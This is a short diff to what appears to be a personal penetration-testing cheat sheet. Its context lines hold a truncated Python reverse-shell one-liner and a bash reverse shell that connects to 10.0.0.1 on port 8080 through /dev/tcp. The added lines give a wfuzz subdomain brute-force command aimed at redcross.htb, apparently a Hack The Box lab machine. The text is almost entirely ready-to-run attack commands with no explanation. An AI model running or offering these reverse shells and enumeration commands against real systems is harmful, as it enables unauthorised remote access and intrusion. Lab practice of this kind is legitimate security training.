@@ -81,3 +81,6 @@ python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socke
 
 Reverse Shell using terminal:
  command = sudo bash -c "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
+
+Wfuzz Redcross.htb:
+wfuzz --hw 28 -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-5000.txt -H "HOST:FUZZ.redcross.htb" https://redcross.htb
